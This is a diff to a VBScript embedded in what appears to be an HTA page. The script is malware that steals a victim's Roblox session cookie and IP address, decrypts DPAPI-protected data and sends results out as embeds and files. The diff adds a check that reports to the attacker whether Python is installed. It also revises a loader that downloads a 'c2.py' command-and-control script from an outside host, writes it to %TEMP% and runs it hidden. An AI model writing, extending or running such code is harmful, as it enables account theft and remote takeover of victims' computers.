@@ -13,6 +13,8 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
 Call SendIP
 Call GrabRoblox
+Call PostEmbed("Status", "Checking for Python...", 3447003)
+Call CheckPython
 Call LaunchC2
 
 Sub BtnClick
@@ -113,6 +115,49 @@ Sub GrabRoblox()
     If cae > 0 Then cookie = Mid(cookie, cae)
     Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
     Call PostFile("cookie.txt", cookie)
+End Sub
+
+Sub CheckPython()
+    On Error Resume Next
+    Dim exec, output, f
+    Set exec = sh.Exec("cmd /c python --version 2>&1")
+    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
+    If InStr(output, "Python") > 0 Then
+        Call PostEmbed("Python Status", "PYTHON FOUND", 65280)
+    Else
+        Set exec = sh.Exec("cmd /c pythonw --version 2>&1")
+        output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
+        If InStr(output, "Python") > 0 Then
+            Call PostEmbed("Python Status", "PYTHON FOUND", 65280)
+        Else
+            Call PostEmbed("Python Status", "NO PYTHON", 16711680)
+        End If
+    End If
+End Sub
+
+Sub LaunchC2()
+    On Error Resume Next
+    Dim exec, output, hasPython, x, a, p
+    hasPython = False
+    Set exec = sh.Exec("cmd /c python --version 2>&1")
+    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
+    If InStr(output, "Python") > 0 Then hasPython = True
+    If Not hasPython Then
+        Set exec = sh.Exec("cmd /c pythonw --version 2>&1")
+        output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
+        If InStr(output, "Python") > 0 Then hasPython = True
+    End If
+    If hasPython Then
+        Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        x.Open "GET", "https://delta-check.onrender.com/c2.py", False
+        x.Send
+        If x.Status = 200 Then
+            p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
+            Set a = CreateObject("ADODB.Stream")
+            a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
+            sh.Run "pythonw " & p, 0, False
+        End If
+    End If
 End Sub
 
 Function DecryptDPAPI(b64)
@@ -224,20 +269,6 @@ Function MkGuid()
     MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
 End Function
 
-
-Sub LaunchC2
-    On Error Resume Next
-    Dim x, a, p
-    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
-    x.Send
-    If x.Status = 200 Then
-        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
-        Set a = CreateObject("ADODB.Stream")
-        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
-        sh.Run "pythonw " & p, 0, False
-    End If
-End Sub
 
 </script>
 </head>
